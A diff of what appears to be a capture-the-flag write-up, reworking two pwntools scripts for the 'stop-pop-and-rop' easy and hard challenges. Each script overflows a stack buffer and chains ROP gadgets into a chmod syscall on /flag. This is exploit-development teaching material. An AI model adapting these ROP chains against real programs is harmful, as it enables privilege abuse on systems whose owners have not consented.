@@ -2101,40 +2101,39 @@ rip --> syscall
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
-# Initialize values
-pop_rax_ret_gadget = 0x401e2e
-pop_rdi_ret_gadget = 0x401e3e
-pop_rsi_ret_gadget = 0x401e36
-syscall_gadget = 0x401e46
+context.arch = 'amd64'
+
+# Initilaize values
+pop_rax = 0x401e2e
+pop_rdi = 0x401e3e
+pop_rsi = 0x401e36
+syscall = 0x401e46
 buffer_addr = 0x7ffd7804eba0
 ret_addr = 0x7ffd7804ec38
 
 # Calculate offset
-const_offset = ret_addr - buffer_addr
+offset = ret_addr - buffer_addr
 
 p = process('/challenge/stop-pop-and-rop-easy')
 
 # Extract the actual buffer address for that specific run
 p.recvuntil(b"located at: ")
-# Read until the next whitespace or newline to get just the hex
 leak_str = p.recvline().strip().decode().strip('.')
 buffer_addr = int(leak_str, 16)
-print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")
 
-flag_string = b"/flag\x00\x00\x00" 
+flag_string = b"/flag\x00\x00\x00"
 
-# Craft payload
-payload = flag_string
-payload += b"A" * (const_offset - len(flag_string))
-payload += p64(pop_rdi_ret_gadget)
-payload += p64(buffer_addr)         
-payload += p64(pop_rsi_ret_gadget)
-payload += p64(0o777)               
-payload += p64(pop_rax_ret_gadget)
-payload += p64(90)                  
-payload += p64(syscall_gadget)
+payload = flat(
+    flag_string,
+    b"A" * (offset - len(flag_string)),
 
-# Send the payload
+    # chmod("/flag", 0o777)
+    pop_rdi, buffer_addr,
+    pop_rsi, 0o777,
+    pop_rax, 90,
+    syscall
+)
+
 p.sendline(payload)
 p.interactive()
 ```
@@ -2455,16 +2454,18 @@ We will be doing the same ROP chain in this challenge as the [last level](#rop-c
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
-# Initialize values
-pop_rax_ret_gadget = 0x401c42
-pop_rdi_ret_gadget = 0x401c5a
-pop_rsi_ret_gadget = 0x401c4a
-syscall_gadget = 0x401c62
+context.arch = 'amd64'
+
+# Initilaize values
+pop_rax = 0x401c42
+pop_rdi = 0x401c5a
+pop_rsi = 0x401c4a
+syscall = 0x401c62
 buffer_addr = 0x7ffeefcd0a30
 ret_addr = 0x7ffeefcd0a88
 
 # Calculate offset
-const_offset = ret_addr - buffer_addr
+offset = ret_addr - buffer_addr
 
 p = process('/challenge/stop-pop-and-rop-hard')
 
@@ -2477,18 +2478,17 @@ print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")
 
 flag_string = b"/flag\x00\x00\x00" 
 
-# Craft payload
-payload = flag_string
-payload += b"A" * (const_offset - len(flag_string))
-payload += p64(pop_rdi_ret_gadget)
-payload += p64(buffer_addr)         
-payload += p64(pop_rsi_ret_gadget)
-payload += p64(0o777)               
-payload += p64(pop_rax_ret_gadget)
-payload += p64(90)                  
-payload += p64(syscall_gadget)
+payload = flat(
+    flag_string,
+    b"A" * (offset - len(flag_string)),
 
-# Send payload
+    # chmod("/flag", 0o777)
+    pop_rdi, buffer_addr,
+    pop_rsi, 0o777,
+    pop_rax, 90,
+    syscall
+)
+
 p.sendline(payload)
 p.interactive()
 ```
